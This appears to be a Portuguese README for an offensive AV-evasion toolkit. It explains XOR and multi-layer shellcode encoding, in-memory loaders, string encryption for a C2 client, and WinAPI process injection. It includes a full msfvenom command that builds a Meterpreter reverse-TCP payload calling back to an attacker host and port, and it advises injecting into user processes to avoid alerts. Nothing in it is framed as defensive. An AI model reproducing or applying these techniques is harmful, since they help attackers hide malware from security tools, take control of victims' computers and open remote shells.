# Evasion — Tutorial

## Dependencias
Apenas stdlib Python — sem dependencias externas.

---

## xor_obfuscate.py
Encoda um payload/shellcode com XOR e gera um loader stub Python que decoda e executa em memoria.

```bash
python xor_obfuscate.py
# Payload file: shellcode.bin
# XOR key: deadbeef
# Output stub: loader.py
```

O `loader.py` gerado usa `VirtualAlloc + CreateThread` para executar o shellcode em memoria — sem escrever o payload decryptado em disco.

---

## payload_encoder.py
Encoder multi-camada: XOR -> Base64 -> Reverse. Mais resistente a deteccao estatica.

```bash
python payload_encoder.py
# Payload: payload.bin
# Key hex: cafebabe
# Output: loader_encoded.py
```

---

## string_encrypt.py
Criptografa strings hardcoded em um script Python existente para evitar deteccao por AV baseada em strings.

```bash
python string_encrypt.py
# Source file: c2_client.py
# Key hex: 1337beef
# Output: c2_client_obf.py
```

Strings como URLs, comandos, paths ficam XOR-encriptadas no codigo, decriptando apenas em runtime.

---

## process_inject.py
Process injection via WinAPI (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread).

```bash
# Primeiro gere o shellcode (ex: msfvenom):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.bin

# Injeta em qualquer processo por PID:
python process_inject.py
# PID: 1234       <- notepad.exe, explorer.exe, etc
# Shellcode: shell.bin
```

Ver PIDs disponiveis:
```bash
tasklist        # Windows
ps aux          # Linux
```

> O shellcode executa no contexto do processo alvo. Use processos de usuario para evitar alertas.
